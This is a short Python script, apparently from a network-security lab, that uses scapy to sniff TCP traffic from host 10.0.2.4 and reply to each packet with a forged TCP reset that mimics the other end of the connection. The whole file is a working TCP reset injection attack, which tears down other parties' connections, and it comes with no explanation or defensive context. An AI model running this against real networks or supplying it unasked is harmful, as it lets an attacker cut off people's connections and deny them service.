#!/usr/bin/env python

from scapy.all import *
conf.L3socket=L3RawSocket

def spoof(pkt):
  src = pkt[IP].src
  dst = pkt[IP].dst
  sport = pkt[TCP].sport
  dport = pkt[TCP].dport
  seq = pkt[TCP].seq
  ack = pkt[TCP].ack

  ip = IP(src=dst, dst=src)
  tcp = TCP(sport=dport, dport=sport, flags="R", seq=ack, ack=seq)
  send(ip/tcp)
  
if __name__ == "__main__":
  filter_str = "tcp and src host 10.0.2.4"
  sniff(filter=filter_str, prn=spoof)
